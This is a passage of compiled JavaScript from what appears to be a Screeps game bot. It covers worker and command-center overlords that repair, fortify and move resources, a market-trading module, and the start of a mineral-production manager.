        const targets = _.filter(this.dismantleStructures, s => (s.targetedBy || []).length < 3);
        const target = worker.pos.findClosestByMultiRoomRange(targets);
        if (target) {
            _.remove(this.dismantleStructures, s => s == target);
            worker.task = Tasks.dismantle(target);
            return true;
        }
        else {
            return false;
        }
    }
    // Find a suitable repair ordering of roads with a depth first search
    buildPavingManifest(worker, room) {
        let energy = worker.carry.energy;
        const targetRefs = {};
        const tasks = [];
        let target;
        let previousPos;
        while (true) {
            if (energy <= 0)
                break;
            if (previousPos) {
                target = _.find(this.colony.roadLogistics.repairableRoads(room), road => road.hits < road.hitsMax && !targetRefs[road.id]
                    && road.pos.getRangeTo(previousPos) <= 1);
            }
            else {
                target = _.find(this.colony.roadLogistics.repairableRoads(room), road => road.hits < road.hitsMax && !targetRefs[road.id]);
            }
            if (target) {
                previousPos = target.pos;
                targetRefs[target.id] = true;
                energy -= (target.hitsMax - target.hits) / REPAIR_POWER;
                tasks.push(Tasks.repair(target));
            }
            else {
                break;
            }
        }
        return Tasks.chain(tasks);
    }
    pavingActions(worker) {
        const roomToRepave = this.colony.roadLogistics.workerShouldRepave(worker);
        this.colony.roadLogistics.registerWorkerAssignment(worker, roomToRepave);
        // Build a paving manifest
        const task = this.buildPavingManifest(worker, roomToRepave);
        if (task) {
            worker.task = task;
            return true;
        }
        else {
            return false;
        }
    }
    fortifyActions(worker, fortifyStructures = this.fortifyBarriers) {
        let lowBarriers;
        const highestBarrierHits = _.max(_.map(fortifyStructures, structure => structure.hits));
        if (highestBarrierHits > WorkerOverlord_1.settings.hitTolerance) {
            // At high barrier HP, fortify only structures that are within a threshold of the lowest
            const lowestBarrierHits = _.min(_.map(fortifyStructures, structure => structure.hits));
            lowBarriers = _.filter(fortifyStructures, structure => structure.hits <= lowestBarrierHits +
                WorkerOverlord_1.settings.hitTolerance);
        }
        else {
            // Otherwise fortify the lowest N structures
            const numBarriersToConsider = 5; // Choose the closest barrier of the N barriers with lowest hits
            lowBarriers = _.take(fortifyStructures, numBarriersToConsider);
        }
        const target = worker.pos.findClosestByMultiRoomRange(lowBarriers);
        if (target) {
            worker.task = Tasks.fortify(target);
            return true;
        }
        else {
            return false;
        }
    }
    nukeFortifyActions(worker, fortifyStructures = this.nukeDefenseRamparts) {
        const target = minBy(fortifyStructures, rampart => {
            const structuresUnderRampart = rampart.pos.lookFor(LOOK_STRUCTURES);
            return _.min(_.map(structuresUnderRampart, structure => {
                const priority = _.findIndex(FortifyPriorities, sType => sType == structure.structureType);
                if (priority >= 0) { // if found
                    return priority;
                }
                else { // not found
                    return 999;
                }
            }));
        });
        if (target) {
            worker.task = Tasks.fortify(target);
            return true;
        }
        else {
            return false;
        }
    }
    upgradeActions(worker) {
        // Sign controller if needed
        if ((!this.colony.controller.signedByMe && !this.colony.controller.signedByScreeps)) {
            worker.task = Tasks.signController(this.colony.controller);
            return true;
        }
        worker.task = Tasks.upgrade(this.room.controller);
        return true;
    }
    handleWorker(worker) {
        if (worker.carry.energy > 0) {
            // Upgrade controller if close to downgrade
            if (this.colony.controller.ticksToDowngrade <= (this.colony.level >= 4 ? 10000 : 2000)) {
                if (this.upgradeActions(worker))
                    return;
            }
            // Repair damaged non-road non-barrier structures
            if (this.repairStructures.length > 0 && this.colony.defcon == DEFCON.safe) {
                if (this.repairActions(worker))
                    return;
            }
            // Fortify critical barriers
            if (this.criticalBarriers.length > 0) {
                if (this.fortifyActions(worker, this.criticalBarriers))
                    return;
            }
            // Build new structures
            if (this.constructionSites.length > 0) {
                if (this.buildActions(worker))
                    return;
            }
            // Build ramparts to block incoming nuke
            if (this.nukeDefenseRamparts.length > 0 && this.colony.terminalState != TERMINAL_STATE_REBUILD) {
                if (this.nukeFortifyActions(worker, this.nukeDefenseRamparts))
                    return;
            }
            // Build and maintain roads
            if (this.colony.roadLogistics.workerShouldRepave(worker) && this.colony.defcon == DEFCON.safe) {
                if (this.pavingActions(worker))
                    return;
            }
            // Dismantle marked structures
            if (this.dismantleStructures.length > 0 && this.colony.defcon == DEFCON.safe) {
                if (this.dismantleActions(worker))
                    return;
            }
            // Fortify walls and ramparts
            if (this.fortifyBarriers.length > 0) {
                if (this.fortifyActions(worker, this.fortifyBarriers))
                    return;
            }
            // Upgrade controller if less than RCL8 or no upgraders
            if ((this.colony.level < 8 || this.colony.upgradeSite.overlord.upgraders.length == 0)
                && this.colony.defcon == DEFCON.safe) {
                if (this.upgradeActions(worker))
                    return;
            }
        }
        else {
            // Acquire more energy
            const workerWithdrawLimit = this.colony.stage == ColonyStage.Larva ? 750 : 100;
            worker.task = Tasks.recharge(workerWithdrawLimit);
        }
    }
    run() {
        this.autoRun(this.workers, worker => this.handleWorker(worker), worker => worker.flee(worker.room.fleeDefaults, { invalidateTask: true }));
    }
};
WorkerOverlord.settings = {
    barrierHits: {
        critical: 2500,
        1: 3e+3,
        2: 3e+3,
        3: 1e+4,
        4: 5e+4,
        5: 1e+5,
        6: 5e+5,
        7: 1e+6,
        8: 2e+7,
    },
    hitTolerance: 100000,
    fortifyDutyThreshold: 500000,
};
WorkerOverlord = WorkerOverlord_1 = __decorate([
    profile
], WorkerOverlord);

/**
 * Command center overlord: spawn and run a dediated commandCenter attendant
 */
let CommandCenterOverlord = class CommandCenterOverlord extends Overlord {
    constructor(commandCenter, priority = OverlordPriority.core.manager) {
        super(commandCenter, 'manager', priority);
        this.commandCenter = commandCenter;
        this.mode = this.colony.layout;
        this.managers = this.zerg(Roles.manager);
        if (this.commandCenter.terminal && _.sum(this.commandCenter.terminal.store) < TERMINAL_CAPACITY - 1000) {
            this.depositTarget = this.commandCenter.terminal;
        }
        else {
            this.depositTarget = this.commandCenter.storage;
        }
        if (this.colony.bunker) {
            const anchor = this.colony.bunker.anchor;
            $.set(this, 'managerRepairTarget', () => minBy(_.filter(anchor.findInRange(anchor.room.barriers, 3), b => b.hits < WorkerOverlord.settings.barrierHits[this.colony.level]), b => b.hits));
        }
    }
    refresh() {
        super.refresh();
        $.refresh(this, 'depositTarget', 'managerRepairTarget');
    }
    init() {
        let setup = Setups.managers.default;
        let spawnRequestOptions = {};
        if (this.colony.layout == 'twoPart') {
            setup = Setups.managers.twoPart;
        }
        if (this.colony.bunker && this.colony.bunker.coreSpawn && this.colony.level == 8
            && !this.colony.roomPlanner.memory.relocating) {
            setup = Setups.managers.stationary;
            if (this.managerRepairTarget && this.colony.assets.energy > WorkerOverlord.settings.fortifyDutyThreshold) {
                setup = Setups.managers.stationary_work; // use working manager body if you have something to repair
            }
            spawnRequestOptions = {
                spawn: this.colony.bunker.coreSpawn,
                directions: [this.colony.bunker.coreSpawn.pos.getDirectionTo(this.colony.bunker.anchor)]
            };
        }
        this.wishlist(1, setup, { options: spawnRequestOptions });
    }
    /**
     * Move anything you are currently holding to deposit location
     */
    unloadCarry(manager) {
        if (_.sum(manager.carry) > 0) {
            manager.task = Tasks.transferAll(this.depositTarget);
            return true;
        }
        else {
            return false;
        }
    }
    /**
     * Handle any supply requests from your transport request group
     */
    supplyActions(manager) {
        const request = this.commandCenter.transportRequests.getPrioritizedClosestRequest(manager.pos, 'supply');
        if (request) {
            const amount = Math.min(request.amount, manager.carryCapacity);
            manager.task = Tasks.transfer(request.target, request.resourceType, amount, { nextPos: this.commandCenter.idlePos });
            if ((manager.carry[request.resourceType] || 0) < amount) {
                // If you are currently carrying other crap, overwrite current task and put junk in terminal/storage
                if (_.sum(manager.carry) > (manager.carry[request.resourceType] || 0)) {
                    manager.task = Tasks.transferAll(this.depositTarget);
                }
                // Otherwise withdraw as much as you can hold
                else {
                    const withdrawAmount = amount - _.sum(manager.carry);
                    let withdrawFrom = this.commandCenter.storage;
                    if (this.commandCenter.terminal
                        && (request.resourceType != RESOURCE_ENERGY
                            || (withdrawFrom.store[request.resourceType] || 0) < withdrawAmount
                            || this.commandCenter.terminal.energy > Energetics.settings.terminal.energy.equilibrium)) {
                        withdrawFrom = this.commandCenter.terminal;
                    }
                    manager.task.fork(Tasks.withdraw(withdrawFrom, request.resourceType, withdrawAmount, { nextPos: request.target.pos }));
                }
            }
            return true;
        }
        return false;
    }
    /**
     * Handle any withdrawal requests from your transport request group
     */
    withdrawActions(manager) {
        if (_.sum(manager.carry) < manager.carryCapacity) {
            const request = this.commandCenter.transportRequests.getPrioritizedClosestRequest(manager.pos, 'withdraw');
            if (request) {
                const amount = Math.min(request.amount, manager.carryCapacity - _.sum(manager.carry));
                manager.task = Tasks.withdraw(request.target, request.resourceType, amount);
                return true;
            }
        }
        else {
            manager.task = Tasks.transferAll(this.depositTarget);
            return true;
        }
        return false;
    }
    /**
     * Move energy into terminal if storage is too full and into storage if storage is too empty
     */
    equalizeStorageAndTerminal(manager) {
        const storage = this.commandCenter.storage;
        const terminal = this.commandCenter.terminal;
        if (!storage || !terminal)
            return false;
        const equilibrium = Energetics.settings.terminal.energy.equilibrium;
        const tolerance = Energetics.settings.terminal.energy.tolerance;
        const storageTolerance = Energetics.settings.storage.total.tolerance;
        let storageEnergyCap = Energetics.settings.storage.total.cap;
        const terminalState = this.colony.terminalState;
        // Adjust max energy allowable in storage if there's an exception state happening
        if (terminalState && terminalState.type == 'out') {
            storageEnergyCap = terminalState.amounts[RESOURCE_ENERGY] || 0;
        }
        // Move energy from storage to terminal if there is not enough in terminal or if there's terminal evacuation
        if ((terminal.energy < equilibrium - tolerance || storage.energy > storageEnergyCap + storageTolerance)
            && storage.energy > 0) {
            if (this.unloadCarry(manager))
                return true;
            manager.task = Tasks.withdraw(storage);
            manager.task.parent = Tasks.transfer(terminal);
            return true;
        }
        // Move energy from terminal to storage if there is too much in terminal and there is space in storage
        if (terminal.energy > equilibrium + tolerance && storage.energy < storageEnergyCap) {
            if (this.unloadCarry(manager))
                return true;
            manager.task = Tasks.withdraw(terminal);
            manager.task.parent = Tasks.transfer(storage);
            return true;
        }
        // Nothing has happened
        return false;
    }
    /**
     * Move enough energy from a terminal which needs to be moved into storage to allow you to rebuild the terminal
     */
    moveEnergyFromRebuildingTerminal(manager) {
        const storage = this.commandCenter.storage;
        const terminal = this.commandCenter.terminal;
        if (!storage || !terminal) {
            return false;
        }
        if (storage.energy < Energetics.settings.storage.energy.destroyTerminalThreshold) {
            if (this.unloadCarry(manager))
                return true;
            manager.task = Tasks.withdraw(terminal);
            manager.task.parent = Tasks.transfer(storage);
            return true;
        }
        return false;
    }
    moveMineralsToTerminal(manager) {
        const storage = this.commandCenter.storage;
        const terminal = this.commandCenter.terminal;
        if (!storage || !terminal) {
            return false;
        }
        // Move all non-energy resources from storage to terminal
        for (const resourceType in storage.store) {
            if (resourceType != RESOURCE_ENERGY && storage.store[resourceType] > 0) {
                if (this.unloadCarry(manager))
                    return true;
                manager.task = Tasks.withdraw(storage, resourceType);
                manager.task.parent = Tasks.transfer(terminal, resourceType);
                return true;
            }
        }
        return false;
    }
    /**
     * Pickup resources dropped on manager position or in tombstones from last manager
     */
    pickupActions(manager) {
        // Pickup any resources that happen to be dropped where you are
        const resources = manager.pos.lookFor(LOOK_RESOURCES);
        if (resources.length > 0) {
            manager.task = Tasks.transferAll(this.depositTarget).fork(Tasks.pickup(resources[0]));
            return true;
        }
        // Look for tombstones at position
        const tombstones = manager.pos.lookFor(LOOK_TOMBSTONES);
        if (tombstones.length > 0) {
            manager.task = Tasks.transferAll(this.depositTarget).fork(Tasks.withdrawAll(tombstones[0]));
            return true;
        }
        return false;
    }
    /**
     * Suicide once you get old and make sure you don't drop and waste any resources
     */
    deathActions(manager) {
        const nearbyManagers = _.filter(this.managers, manager => manager.pos.inRangeTo(this.commandCenter.pos, 3));
        if (nearbyManagers.length > 1) {
            if (_.sum(manager.carry) == 0) {
                const nearbySpawn = _.first(manager.pos.findInRange(manager.room.spawns, 1));
                if (nearbySpawn) {
                    nearbySpawn.recycleCreep(manager.creep);
                }
                else {
                    manager.suicide();
                }
            }
            else {
                manager.task = Tasks.transferAll(this.depositTarget);
            }
            return true;
        }
        return false;
    }
    handleManager(manager) {
        // Handle switching to next manager
        if (manager.ticksToLive < 150) {
            if (this.deathActions(manager))
                return;
        }
        // Pick up any dropped resources on ground
        if (this.pickupActions(manager))
            return;
        // Move minerals from storage to terminal if needed
        if (hasMinerals(this.commandCenter.storage.store)) {
            if (this.moveMineralsToTerminal(manager))
                return;
        }
        // Fill up storage before you destroy terminal if rebuilding room
        if (this.colony.terminalState == TERMINAL_STATE_REBUILD) {
            if (this.moveEnergyFromRebuildingTerminal(manager))
                return;
        }
        // Moving energy to terminal gets priority if evacuating room
        if (this.colony.terminalState && this.colony.terminalState.type == 'out') {
            if (this.equalizeStorageAndTerminal(manager))
                return;
        }
        // Fulfill withdraw requests
        if (this.commandCenter.transportRequests.needsWithdrawing) {
            if (this.withdrawActions(manager))
                return;
        }
        // Fulfill supply requests
        if (this.commandCenter.transportRequests.needsSupplying) {
            if (this.supplyActions(manager))
                return;
        }
        // Move energy between storage and terminal if needed
        this.equalizeStorageAndTerminal(manager);
    }
    /**
     * Handle idle actions if the manager has nothing to do
     */
    idleActions(manager) {
        if (this.mode == 'bunker' && this.managerRepairTarget && manager.getActiveBodyparts(WORK) > 0) {
            // Repair ramparts when idle
            if (manager.carry.energy > 0) {
                manager.repair(this.managerRepairTarget);
            }
            else {
                manager.withdraw(this.depositTarget);
            }
        }
        if (!manager.pos.isEqualTo(this.commandCenter.idlePos)) {
            manager.goTo(this.commandCenter.idlePos);
        }
    }
    run() {
        for (const manager of this.managers) {
            // Get a task if needed
            if (manager.isIdle) {
                this.handleManager(manager);
            }
            // If you have a valid task, run it; else go to idle pos
            if (manager.hasValidTask) {
                manager.run();
            }
            else {
                this.idleActions(manager);
            }
        }
    }
};
CommandCenterOverlord = __decorate([
    profile
], CommandCenterOverlord);

var TraderJoe_1;
const TraderMemoryDefaults = {
    cache: {
        sell: {},
        buy: {},
        tick: 0,
    },
    equalizeIndex: 0
};
const TraderStatsDefaults = {
    credits: 0,
    bought: {},
    sold: {},
};
// Maximum prices I'm willing to pay to buy various resources - based on shard2 market data in June 2018
// (might not always be up to date)
const maxMarketPrices = {
    default: 5.0,
    [RESOURCE_HYDROGEN]: 0.3,
    [RESOURCE_OXYGEN]: 0.25,
    [RESOURCE_UTRIUM]: 0.3,
    [RESOURCE_LEMERGIUM]: 0.25,
    [RESOURCE_KEANIUM]: 0.25,
    [RESOURCE_ZYNTHIUM]: 0.25,
    [RESOURCE_CATALYST]: 0.5,
    [RESOURCE_ENERGY]: 0.05,
};
const MAX_ENERGY_SELL_ORDERS = 5;
const MAX_ENERGY_BUY_ORDERS = 5;
/**
 * The trade network controls resource acquisition and disposal on the player market.
 */
let TraderJoe = TraderJoe_1 = class TraderJoe {
    constructor() {
        this.memory = Mem.wrap(Memory.Overmind, 'trader', TraderMemoryDefaults, true);
        this.stats = Mem.wrap(Memory.stats.persistent, 'trader', TraderStatsDefaults);
        this.notifications = [];
    }
    refresh() {
        this.memory = Mem.wrap(Memory.Overmind, 'trader', TraderMemoryDefaults, true);
        this.stats = Mem.wrap(Memory.stats.persistent, 'trader', TraderStatsDefaults);
        this.notifications = [];
    }
    notify(msg) {
        this.notifications.push(bullet + msg);
    }
    /**
     * Builds a cache for market - this is very expensive; use infrequently
     */
    buildMarketCache(verbose = false, orderThreshold = 1000) {
        this.invalidateMarketCache();
        const myActiveOrderIDs = _.map(_.filter(Game.market.orders, order => order.active), order => order.id);
        const allOrders = Game.market.getAllOrders(order => !myActiveOrderIDs.includes(order.id) &&
            order.amount >= orderThreshold); // don't include tiny orders
        const groupedBuyOrders = _.groupBy(_.filter(allOrders, o => o.type == ORDER_BUY), o => o.resourceType);
        const groupedSellOrders = _.groupBy(_.filter(allOrders, o => o.type == ORDER_SELL), o => o.resourceType);
        for (const resourceType in groupedBuyOrders) {
            // Store buy order with maximum price in cache
            const prices = _.map(groupedBuyOrders[resourceType], o => o.price);
            const high = _.max(prices);
            const low = _.min(prices);
            if (verbose)
                console.log(`${resourceType} BUY: high: ${high}  low: ${low}`);
            // this.memory.cache.buy[resourceType] = minBy(groupedBuyOrders[resourceType], (o:Order) => -1 * o.price);
            this.memory.cache.buy[resourceType] = { high: high, low: low };
        }
        for (const resourceType in groupedSellOrders) {
            // Store sell order with minimum price in cache
            const prices = _.map(groupedSellOrders[resourceType], o => o.price);
            const high = _.max(prices);
            const low = _.min(prices);
            if (verbose)
                console.log(`${resourceType} SELL: high: ${high}  low: ${low}`);
            // this.memory.cache.sell[resourceType] = minBy(groupedSellOrders[resourceType], (o:Order) => o.price);
            this.memory.cache.sell[resourceType] = { high: high, low: low };
        }
        this.memory.cache.tick = Game.time;
    }
    invalidateMarketCache() {
        this.memory.cache = {
            sell: {},
            buy: {},
            tick: 0,
        };
    }
    /**
     * Cost per unit including transfer price with energy converted to credits
     */
    effectivePrice(order, terminal) {
        if (order.roomName) {
            const transferCost = Game.market.calcTransactionCost(1000, order.roomName, terminal.room.name) / 1000;
            const energyToCreditMultiplier = 0.01; // this.cache.sell[RESOURCE_ENERGY] * 1.5;
            return order.price + transferCost * energyToCreditMultiplier;
        }
        else {
            return Infinity;
        }
    }
    /**
     * Cost per unit for a buy order including transfer price with energy converted to credits
     */
    effectiveBuyPrice(order, terminal) {
        if (order.roomName) {
            const transferCost = Game.market.calcTransactionCost(1000, order.roomName, terminal.room.name) / 1000;
            const energyToCreditMultiplier = 0.01; // this.cache.sell[RESOURCE_ENERGY] * 1.5;
            return order.price - transferCost * energyToCreditMultiplier;
        }
        else {
            return Infinity;
        }
    }
    // private getBestOrder(mineralType: ResourceConstant, type: 'buy' | 'sell'): Order | undefined {
    //  let cachedOrder = this.memory.cache[type][mineralType];
    //  if (cachedOrder) {
    //      let order = Game.market.getOrderById(cachedOrder.id);
    //      if (order) {
    //          // Update the order in memory
    //          this.memory.cache[type][mineralType] = order;
    //      }
    //  }
    // }
    cleanUpInactiveOrders() {
        // Clean up sell orders that have expired or orders belonging to rooms no longer owned
        const ordersToClean = _.filter(Game.market.orders, o => (o.type == ORDER_SELL && o.active == false && o.remainingAmount == 0) // if order is expired, or
            || (Game.time - o.created > TraderJoe_1.settings.market.orders.timeout // order is old and almost done
                && o.remainingAmount < TraderJoe_1.settings.market.orders.cleanupAmount)
            || (o.roomName && !Overmind.colonies[o.roomName])); // order placed from dead colony
        for (const order of ordersToClean) {
            Game.market.cancelOrder(order.id);
        }
    }
    /**
     * Opportunistically sells resources when the buy price is higher than current market sell low price
     */
    lookForGoodDeals(terminal, resource, margin = 1.25) {
        if (Game.market.credits < TraderJoe_1.settings.market.reserveCredits) {
            return;
        }
        let amount = 5000;
        if (resource === RESOURCE_POWER) {
            amount = 100;
        }
        let ordersForMineral = Game.market.getAllOrders({ resourceType: resource, type: ORDER_BUY });
        ordersForMineral = _.filter(ordersForMineral, order => order.amount >= amount);
        if (ordersForMineral === undefined) {
            return;
        }
        const marketLow = this.memory.cache.sell[resource] ? this.memory.cache.sell[resource].low : undefined;
        if (marketLow == undefined) {
            return;
        }
        const order = maxBy(ordersForMineral, order => this.effectiveBuyPrice(order, terminal));
        if (order && order.price > marketLow * margin) {
            const amount = Math.min(order.amount, 10000);
            const cost = Game.market.calcTransactionCost(amount, terminal.room.name, order.roomName);
            if (terminal.store[RESOURCE_ENERGY] > cost) {
                const response = Game.market.deal(order.id, amount, terminal.room.name);
                this.logTransaction(order, terminal.room.name, amount, response);
            }
        }
    }
    /**
     * Buy a resource on the market
     */
    buy(terminal, resource, amount) {
        if (Game.market.credits < TraderJoe_1.settings.market.reserveCredits || terminal.cooldown > 0) {
            return;
        }
        amount = Math.max(amount, TERMINAL_MIN_SEND);
        if (terminal.store[RESOURCE_ENERGY] < 10000 || terminal.storeCapacity - _.sum(terminal.store) < amount) {
            return;
        }
        let ordersForMineral = Game.market.getAllOrders({ resourceType: resource, type: ORDER_SELL });
        ordersForMineral = _.filter(ordersForMineral, order => order.amount >= amount);
        const bestOrder = minBy(ordersForMineral, (order) => order.price);
        let maxPrice = maxMarketPrices[resource] || maxMarketPrices.default;
        if (!onPublicServer()) {
            maxPrice = Infinity; // don't care about price limits if on private server
        }
        if (bestOrder && bestOrder.price <= maxPrice) {
            const response = Game.market.deal(bestOrder.id, amount, terminal.room.name);
            this.logTransaction(bestOrder, terminal.room.name, amount, response);
        }
    }
    /**
     * Sell a resource on the market, either through a sell order or directly
     */
    sell(terminal, resource, amount, maxOrdersOfType = Infinity) {
        if (Game.market.credits < TraderJoe_1.settings.market.reserveCredits) {
            return this.sellDirectly(terminal, resource, amount);
        }
        else {
            this.maintainSellOrder(terminal, resource, amount, maxOrdersOfType);
        }
    }
    /**
     * Sell resources directly to a buyer rather than making a sell order
     */
    sellDirectly(terminal, resource, amount, flexibleAmount = true) {
        // If flexibleAmount is allowed, consider selling to orders which don't need the full amount
        const minAmount = flexibleAmount ? TERMINAL_MIN_SEND : amount;
        let ordersForMineral = Game.market.getAllOrders({ resourceType: resource, type: ORDER_BUY });
        ordersForMineral = _.filter(ordersForMineral, order => order.amount >= minAmount);
        const order = maxBy(ordersForMineral, order => this.effectiveBuyPrice(order, terminal));
        if (order) {
            const sellAmount = Math.min(order.amount, amount);
            const cost = Game.market.calcTransactionCost(sellAmount, terminal.room.name, order.roomName);
            if (terminal.store[RESOURCE_ENERGY] > cost) {
                const response = Game.market.deal(order.id, sellAmount, terminal.room.name);
                this.logTransaction(order, terminal.room.name, amount, response);
                return response;
            }
        }
    }
    /**
     * Create or maintain a buy order
     */
    maintainBuyOrder(terminal, resource, amount, maxOrdersOfType = Infinity) {
        const marketHigh = this.memory.cache.buy[resource] ? this.memory.cache.buy[resource].high : undefined;
        if (!marketHigh) {
            return;
        }
        const maxPrice = maxMarketPrices[resource] || maxMarketPrices.default;
        if (marketHigh > maxPrice) {
            return;
        }
        const order = _.find(Game.market.orders, o => o.type == ORDER_BUY &&
            o.resourceType == resource &&
            o.roomName == terminal.room.name);
        if (order) {
            if (order.price < marketHigh || (order.price > marketHigh && order.remainingAmount == 0)) {
                const ret = Game.market.changeOrderPrice(order.id, marketHigh);
                this.notify(`${terminal.room.print}: updating buy order price for ${resource} from ` +
                    `${order.price} to ${marketHigh}. Response: ${ret}`);
            }
            if (order.remainingAmount < 2000) {
                const addAmount = (amount - order.remainingAmount);
                const ret = Game.market.extendOrder(order.id, addAmount);
                this.notify(`${terminal.room.print}: extending buy order for ${resource} by ${addAmount}.` +
                    ` Response: ${ret}`);
            }
        }
        else {
            const ordersOfType = _.filter(Game.market.orders, o => o.type == ORDER_BUY && o.resourceType == resource);
            if (ordersOfType.length < maxOrdersOfType) {
                const ret = Game.market.createOrder(ORDER_BUY, resource, marketHigh, amount, terminal.room.name);
                this.notify(`${terminal.room.print}: creating buy order for ${resource} at price ${marketHigh}. ` +
                    `Response: ${ret}`);
            }
            // else {
            //  this.notify(`${terminal.room.print}: cannot create another buy order for ${resource}:` +
            //              ` too many (${ordersOfType.length})`);
            // }
        }
    }
    /**
     * Create or maintain a sell order
     */
    maintainSellOrder(terminal, resource, amount, maxOrdersOfType = Infinity) {
        const marketLow = this.memory.cache.sell[resource] ? this.memory.cache.sell[resource].low : undefined;
        if (!marketLow) {
            return;
        }
        const order = _.find(Game.market.orders, o => o.type == ORDER_SELL &&
            o.resourceType == resource &&
            o.roomName == terminal.room.name);
        if (order) {
            if (order.price > marketLow || (order.price < marketLow && order.remainingAmount == 0)) {
                const ret = Game.market.changeOrderPrice(order.id, marketLow);
                this.notify(`${terminal.room.print}: updating sell order price for ${resource} from ` +
                    `${order.price} to ${marketLow}. Response: ${ret}`);
            }
            if (order.remainingAmount < 2000) {
                const addAmount = (amount - order.remainingAmount);
                const ret = Game.market.extendOrder(order.id, addAmount);
                this.notify(`${terminal.room.print}: extending sell order for ${resource} by ${addAmount}.` +
                    ` Response: ${ret}`);
            }
        }
        else {
            const ordersOfType = _.filter(Game.market.orders, o => o.type == ORDER_SELL && o.resourceType == resource);
            if (ordersOfType.length < maxOrdersOfType) {
                const ret = Game.market.createOrder(ORDER_SELL, resource, marketLow, amount, terminal.room.name);
                this.notify(`${terminal.room.print}: creating sell order for ${resource} at price ${marketLow}. ` +
                    `Response: ${ret}`);
            }
            // else {
            //  this.notify(`${terminal.room.print}: cannot create another sell order for ${resource}:` +
            //              ` too many (${ordersOfType.length})`);
            // }
        }
    }
    priceOf(mineralType) {
        if (this.memory.cache.sell[mineralType]) {
            return this.memory.cache.sell[mineralType].low;
        }
        else {
            return Infinity;
        }
    }
    /**
     * Pretty-prints transaction information in the console
     */
    logTransaction(order, terminalRoomName, amount, response) {
        const action = order.type == ORDER_SELL ? 'BOUGHT ' : 'SOLD   ';
        const cost = (order.price * amount).toFixed(2);
        const fee = order.roomName ? Game.market.calcTransactionCost(amount, order.roomName, terminalRoomName) : 0;
        const roomName = Game.rooms[terminalRoomName] ? Game.rooms[terminalRoomName].print : terminalRoomName;
        let msg;
        if (order.type == ORDER_SELL) {
            msg = `${roomName} ${leftArrow} ${amount} ${order.resourceType} ${leftArrow} ` +
                `${printRoomName(order.roomName)} (result: ${response})`;
        }
        else {
            msg = `${roomName} ${rightArrow} ${amount} ${order.resourceType} ${rightArrow} ` +
                `${printRoomName(order.roomName)} (result: ${response})`;
        }
        this.notify(msg);
    }
    /**
     * Look through transactions happening on the previous tick and record stats
     */
    recordStats() {
        this.stats.credits = Game.market.credits;
        const time = Game.time - 1;
        // Incoming transactions
        for (const transaction of Game.market.incomingTransactions) {
            if (transaction.time < time) {
                break; // only look at things from last tick
            }
            else {
                if (transaction.order) {
                    const resourceType = transaction.resourceType;
                    const amount = transaction.amount;
                    const price = transaction.order.price;
                    if (!this.stats.bought[resourceType]) {
                        this.stats.bought[resourceType] = { amount: 0, credits: 0 };
                    }
                    this.stats.bought[resourceType].amount += amount;
                    this.stats.bought[resourceType].credits += amount * price;
                }
            }
        }
        // Outgoing transactions
        for (const transaction of Game.market.outgoingTransactions) {
            if (transaction.time < time) {
                break; // only look at things from last tick
            }
            else {
                if (transaction.order) {
                    const resourceType = transaction.resourceType;
                    const amount = transaction.amount;
                    const price = transaction.order.price;
                    if (!this.stats.sold[resourceType]) {
                        this.stats.sold[resourceType] = { amount: 0, credits: 0 };
                    }
                    this.stats.sold[resourceType].amount += amount;
                    this.stats.sold[resourceType].credits += amount * price;
                }
            }
        }
    }
    init() {
        if (Game.time - (this.memory.cache.tick || 0) > TraderJoe_1.settings.cache.timeout) {
            this.buildMarketCache();
        }
    }
    run() {
        if (Game.time % 10 == 0) {
            this.cleanUpInactiveOrders();
        }
        if (this.notifications.length > 0) {
            log.info(`Trade network activity: ` + alignedNewline + this.notifications.join(alignedNewline));
        }
        this.recordStats();
    }
};
TraderJoe.settings = {
    cache: {
        timeout: 25,
    },
    market: {
        reserveCredits: 10000,
        boostCredits: 25000,
        energyCredits: 50000,
        orders: {
            timeout: 100000,
            cleanupAmount: 10,
        }
    },
};
TraderJoe = TraderJoe_1 = __decorate([
    profile,
    assimilationLocked
], TraderJoe);

var Abathur_1;
const priorityStockAmounts = {
    XGHO2: 1000,
    XLHO2: 1000,
    XZHO2: 1000,
    XZH2O: 1000,
    XKHO2: 1000,
    XUH2O: 1000,
    GHO2: 1000,
    LHO2: 1000,
    ZHO2: 1000,
    ZH2O: 1000,
    UH2O: 1000,
    KHO2: 1000,
    GO: 1000,
    LO: 1000,
    ZO: 1000,
    ZH: 1000,
    UH: 1000,
    KO: 1000,
    G: 2000,
};
const wantedStockAmounts = {
    UH: 3000,
    KO: 3000,
    XGHO2: 10000,
    XLHO2: 10000,
    XZHO2: 6000,
    XZH2O: 6000,
    XKHO2: 8000,
    XUH2O: 8000,
    G: 5000,
    XLH2O: 3000,
    LH: 3000,
    XUHO2: 3000,
    XKH2O: 3000,
    ZK: 800,
    UL: 800,
    GH: 800,
    KH: 800,
    OH: 800,
    GH2O: 800,
    LH2O: 800,
    KH2O: 800,
    XGH2O: 12000,
};
const baseStockAmounts = {
    [RESOURCE_CATALYST]: 5000,
    [RESOURCE_ZYNTHIUM]: 5000,
    [RESOURCE_LEMERGIUM]: 5000,
    [RESOURCE_KEANIUM]: 5000,
    [RESOURCE_UTRIUM]: 5000,
    [RESOURCE_OXYGEN]: 5000,
    [RESOURCE_HYDROGEN]: 5000
};
// Compute priority and wanted stock
const _priorityStock = [];
for (const resourceType in priorityStockAmounts) {
    const stock = {
        mineralType: resourceType,
        amount: priorityStockAmounts[resourceType]
    };
    _priorityStock.push(stock);
}
const _wantedStock = [];
for (const resourceType in wantedStockAmounts) {
    const stock = {
        mineralType: resourceType,
        amount: wantedStockAmounts[resourceType]
    };
    _wantedStock.push(stock);
}
const priorityStock = _priorityStock;
const wantedStock = _wantedStock;
const AbathurMemoryDefaults = {
    sleepUntil: 0
};
/**
 * Abathur is responsible for the evolution of the swarm and directs global production of minerals. Abathur likes
 * efficiency, XGHO2, and high lab uptime, and dislikes pronouns.
 */
let Abathur = Abathur_1 = class Abathur {
    constructor(colony) {
        this.colony = colony;
        this.memory = Mem.wrap(this.colony.memory, 'abathur', AbathurMemoryDefaults);
        this.priorityStock = priorityStock;
        this.wantedStock = wantedStock;
        this.assets = colony.assets;
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'abathur', AbathurMemoryDefaults);
        this.assets = this.colony.assets;
    }
    /**
     * Summarizes the total of all resources currently in a colony store structure
     */
    computeGlobalAssets() {
        const colonyAssets = [];
        for (const colony of getAllColonies()) {
            colonyAssets.push(colony.assets);
        }
        return mergeSum(colonyAssets);
    }
    get globalAssets() {
        if (!this._globalAssets) {
            this._globalAssets = this.computeGlobalAssets();
        }
        return this._globalAssets;
    }
    canReceiveBasicMineralsForReaction(mineralQuantities, amount) {
        for (const mineral in mineralQuantities) {
